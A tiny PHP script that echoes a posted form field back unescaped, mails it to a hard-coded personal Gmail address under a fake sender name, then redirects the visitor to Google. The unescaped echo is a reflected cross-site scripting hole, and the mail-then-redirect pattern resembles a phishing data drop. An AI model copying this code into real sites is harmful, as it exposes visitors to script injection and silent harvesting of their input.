<?php
$MyText=$_POST[MyText];
echo"收到了".$MyText;
mail("timmy50406@gmail.com",$MyText,$MyText,"from:香蕉人");
$url = "http://www.google.com";
echo "<script type='text/javascript'>";
echo "window.location.href='$url'";
echo "</script>"; 
?>
